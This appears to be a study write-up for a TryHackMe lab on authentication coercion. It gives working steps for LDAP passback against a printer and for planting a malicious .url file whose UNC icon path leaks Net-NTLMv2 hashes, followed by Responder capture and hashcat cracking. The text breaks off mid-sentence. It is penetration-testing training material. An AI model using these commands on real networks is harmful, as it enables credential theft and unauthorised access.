
**Authentication coercion** tricks a device/user into sending authentication material to an attacker-controlled machine.
    
- ATT&CK: **T1187 – Forced Authentication**

---

### 1. LDAP Passback

Many printers/MFPs store LDAP service-account credentials for AD lookups.

**Attack flow:**
1. Access printer web admin panel.
2. Change LDAP server to your `tun0` IP.
3. Set a listener port.
4. Trigger **Test Connection**.
5. Capture the LDAP credentials.
    
Start a listener:
```bash
nc -lvnp 4444
```
- `-l` → listen mode
- `-v` → verbose
- `-n` → don't resolve DNS
- `-p 4444` → listen on port 4444
    

If plaintext LDAP is used, the captured traffic may contain:
```text
CN=svc.ldap,...:PASSWORD
```

> LDAP uses **389**, while LDAPS uses **636**. Plain LDAP can expose credentials because authentication isn't protected by TLS.

**Note:** Some modern devices negotiate SASL authentication or TLS-wrapped LDAP, in which case a simple Netcat listener won't capture plaintext credentials. In these situations, you would need to set up a rogue LDAP server (e.g., using `slapd` or Impacket's `ldapd.py`) that can handle the negotiation and capture the bind credentials. For this room, the target device uses plaintext LDAP, so Netcat is sufficient.

---

### 2. Verify Captured Credentials

Use NetExec:

```bash
nxc smb <TARGET_IP> -u 'svc.ldap' -p 'PASSWORD'
```
- `smb` → authenticate/enumerate through SMB
- `-u` → username
- `-p` → password
    
A successful authentication confirms the credentials are valid, even if the account is disabled or otherwise restricted.

---

# File-Based Coercion

We place a specially crafted file on a writable network share. When a user browses that share using Windows Explorer, the operating system automatically attempts to render the file's icon. If the icon path points to a UNC path on our attacker machine (e.g., `\\TUN0_IP\share\icon.ico`), Windows will follow that path and send the browsing user's NTLMv2 hash to our listener, all without the user opening or clicking the file.

A malicious `.url` file can cause Windows Explorer to access an attacker-controlled **UNC path** when the user browses a writable SMB share.

This can trigger an SMB authentication attempt and leak a **Net-NTLMv2 hash**.

### Create the malicious `.url`
```bash
cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\YOUR_TUN0_IP\icons\icon.ico
IconIndex=1
EOF
```

Important field:
```ini
IconFile=\\YOUR_TUN0_IP\icons\icon.ico
```

The UNC path causes Windows to attempt SMB authentication to your machine.

`@Shortcut.url` starts with `@` so it appears near the top of the directory listing, increasing the chance that Explorer processes it quickly.

---

## Start Responder

```bash
sudo responder -I tun0
```

- `-I tun0` → listen on the VPN interface.

- Responder listens for protocols such as SMB/LLMNR/NBT-NS and can capture authentication attempts.
    

---

## Upload the File

Connect to the writable share:
```bash
smbclient //SERVER/shared-docs -U 'DOMAIN\username%password'
```

Upload:
```text
smb: \> put @Shortcut.url
smb: \> exit
```

When a user browses the share, you may receive:
```text
Username : DOMAIN\user
Hash     : user::DOMAIN:...
```

This is a **Net-NTLMv2 hash**, not the plaintext password.

---
# Crack Net-NTLMv2

Save the captured hash as:
```text
hash.txt
```

Then:
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```
- `-m 5600` → Net-NTLMv2 hash mode
- `hash.txt` → captured hash
- `rockyou.txt` → wordlist
- `--force` → force Hashcat to run despite warnings

---

## A Note on Advanced Coercion Techniques

The two techniques covered in this task are just the tip of the iceberg when it comes to authentication coercion. More advanced techniques, including PetitPotam, PrinterBug/SpoolSample, and DFSCoerce, can force domain controllers and other high-value machines to authenticate to an attacker-controlled listener. Combined with relay attacks (where you forward the captured authentication rather than cracking it)